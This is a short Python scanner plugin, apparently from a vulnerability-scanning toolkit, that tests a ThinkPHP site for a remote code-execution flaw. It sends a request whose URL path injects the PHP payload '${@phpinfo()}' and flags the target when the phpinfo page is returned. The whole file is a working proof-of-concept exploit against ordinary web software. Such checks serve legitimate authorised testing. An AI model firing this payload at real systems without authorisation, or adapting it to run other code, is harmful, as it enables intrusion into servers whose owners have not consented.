#encoding=utf-8
#thinkPHP框架代码执行
#__author__ = 'greenboy'
	#coding=utf-8
import requests
def run(target):
#thinkphp code exec"
    results = []
    url = "http://" + target + "/index.php/module/aciton/param1/${@phpinfo()}"
    try:
        r = requests.get(url, timeout=5)
    except Exception:
        pass
    else:
        r.close()
        if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
            results.append(url)
    return results
